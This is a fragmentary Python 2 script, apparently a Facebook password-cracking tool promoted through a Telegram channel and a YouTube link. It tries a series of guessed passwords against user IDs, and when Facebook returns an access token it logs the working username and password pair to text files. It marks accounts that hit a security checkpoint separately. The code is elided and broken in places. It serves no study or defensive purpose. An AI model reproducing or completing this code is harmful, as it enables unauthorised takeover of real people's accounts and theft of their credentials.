# MY TELEGRAM CHANNEL @BEST TECH 
# MY TELEGRAM GROUP @BEST_TECHING_001 
...
Nking_youtube = random.choice(["https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw"])

youtuber = Nking_youtube

def youtube():
	Style_profaisor(" ) Thank you")
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[NKING_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[NKING_CP] ' + k + c + user + ' | ' + pass4
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[NKING_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Nking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[NKING_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Nking.txt', 'a')
